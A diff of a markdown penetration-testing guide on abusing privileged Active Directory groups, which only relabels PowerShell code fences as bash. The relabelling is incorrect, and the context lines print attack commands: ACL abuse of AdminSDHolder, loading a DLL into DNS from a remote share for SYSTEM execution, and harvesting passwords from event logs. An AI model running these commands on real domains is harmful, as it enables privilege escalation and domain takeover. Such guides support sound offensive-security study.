@@ -14,7 +14,7 @@ This group is empowered to create accounts and groups that are not administrator
 
 To identify the members of this group, the following command is executed:
 
-```powershell
+```bash
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
 
@@ -28,7 +28,7 @@ An attacker could exploit this by modifying the **AdminSDHolder** group's ACL, g
 
 Commands to review the members and modify permissions include:
 
-```powershell
+```bash
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
@@ -66,7 +66,7 @@ Membership in the `Backup Operators` group provides access to the `DC01` file sy
 
 To list group members, execute:
 
-```powershell
+```bash
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
 
@@ -160,7 +160,7 @@ Members of the **DnsAdmins** group can exploit their privileges to load an arbit
 
 To list members of the DnsAdmins group, use:
 
-```powershell
+```bash
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
 
@@ -168,7 +168,7 @@ Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 
 Members can make the DNS server load an arbitrary DLL (either locally or from a remote share) using commands such as:
 
-```powershell
+```bash
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
 An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
@@ -208,7 +208,7 @@ DnsAdmins can manipulate DNS records to perform Man-in-the-Middle (MitM) attacks
 ### Event Log Readers
 Members can access event logs, potentially finding sensitive information such as plaintext passwords or command execution details:
 
-```powershell
+```bash
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
@@ -218,7 +218,7 @@ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Va
 
 This group can modify DACLs on the domain object, potentially granting DCSync privileges. Techniques for privilege escalation exploiting this group are detailed in Exchange-AD-Privesc GitHub repo.
 
-```powershell
+```bash
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
@@ -251,7 +251,7 @@ Members of the **Print Operators** group are endowed with several privileges, in
 
 To list the members of this group, the following PowerShell command is used:
 
-```powershell
+```bash
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
 
@@ -261,7 +261,7 @@ For more detailed exploitation techniques related to **`SeLoadDriverPrivilege`**
 
 This group's members are granted access to PCs via Remote Desktop Protocol (RDP). To enumerate these members, PowerShell commands are available:
 
-```powershell
+```bash
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
@@ -272,7 +272,7 @@ Further insights into exploiting RDP can be found in dedicated pentesting resour
 
 Members can access PCs over **Windows Remote Management (WinRM)**. Enumeration of these members is achieved through:
 
-```powershell
+```bash
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
@@ -283,7 +283,7 @@ For exploitation techniques related to **WinRM**, specific documentation should 
 
 This group has permissions to perform various configurations on Domain Controllers, including backup and restore privileges, changing system time, and shutting down the system. To enumerate the members, the command provided is:
 
-```powershell
+```bash
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
 
